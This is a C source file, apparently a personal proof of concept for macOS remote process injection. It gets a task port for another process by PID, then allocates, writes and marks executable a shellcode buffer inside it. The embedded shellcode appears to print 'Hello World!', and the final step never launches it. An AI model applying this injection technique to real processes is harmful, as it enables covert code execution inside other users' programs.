/*
testing remote process/thread injection 
https://sinister.ly/Thread-Memory-Injection-on-macOS

//task_for_pid needs help http://os-tres.net/blog/2010/02/17/mac-os-x-and-task-for-pid-mach-call/

//CANNOT USE TASK_FOR_PID in native OSX binaries since 10.14 (compiled with SIP)
//see thread injection here: https://knight.sc/malware/2019/03/15/code-injection-on-macos.html
*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach_vm.h>
#include<mach/mach_traps.h>
#include <mach/mach_init.h>
#include <Security/Authorization.h>

int acquireTaskportRight()
{
  OSStatus stat;
  AuthorizationItem taskport_item[] = {{"system.privilege.taskport:"}};
  AuthorizationRights rights = {1, taskport_item}, *out_rights = NULL;
  AuthorizationRef author;
  int retval = 0;

  AuthorizationFlags auth_flags = kAuthorizationFlagExtendRights | kAuthorizationFlagPreAuthorize | kAuthorizationFlagInteractionAllowed | ( 1 << 5);

  stat = AuthorizationCreate (NULL, kAuthorizationEmptyEnvironment,auth_flags,&author);
  if (stat != errAuthorizationSuccess)
    {
      return 0;
    }

  stat = AuthorizationCopyRights ( author, &rights, kAuthorizationEmptyEnvironment, auth_flags,&out_rights);
  if (stat != errAuthorizationSuccess)
    {
      printf("fail");
      return 1;
    }
  return 0;
}

void check(int cond, char* msg)
{
  if (!cond)
    {
      printf("%s\n", msg);
      exit(-1);
    }
}


//defining a struct for our VM related data
typedef struct {
    mach_vm_address_t addr;
    size_t size;
    vm_prot_t prot;
} vm_region_t;

char payload[] = "\xeb\x1e\x5e\xb8\x04\x00\x00\x02\xbf\x01\x00\x00\x00\xba\x0e\x00\x00\x00\x0f\x05\xb8\x01\x00\x00\x02\xbf\x00\x00\x00\x00\x0f\x05\xe8\xdd\xff\xff\xff\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x21\x0d\x0a";

int main(int argc, char *argv[]){


    vm_region_t shellcode = {
        .addr = 0,
        .size = sizeof(payload),
        .prot = VM_PROT_READ | VM_PROT_EXECUTE
    };

    if (acquireTaskportRight() != 0)
    {
      printf("acquireTaskportRight() failed!\n");
      exit(0);
    }

    //get handle to remote task
    mach_port_t task;
    printf("[*] Getting handle to task: %d\n", atoi(argv[1]));
    task_for_pid(mach_task_self(), atoi(argv[1]), &task);
    printf("[+] Handle for task: 0x%x\n", task);


    //allocate memory in remote task - save address to shellcode.addr
    mach_vm_allocate(task, &shellcode.addr, shellcode.size, VM_FLAGS_ANYWHERE);
    printf("[+] Allocated %d bytes in remote buffer at: 0x%016lx\n", shellcode.size, shellcode.addr);

    //write payload into remote memory
    mach_vm_write(task, shellcode.addr, payload, sizeof(payload));
    printf("[+] writing %d bytes to remote buffer\n", shellcode.size);

    //adjust permissions from RW to RX
    mach_vm_protect(task, shellcode.addr, shellcode.size, 0, shellcode.prot);
    printf("[+] Adjusting VM protections in buffer to RX\n");

    //kick off shellcode
    printf("done");
}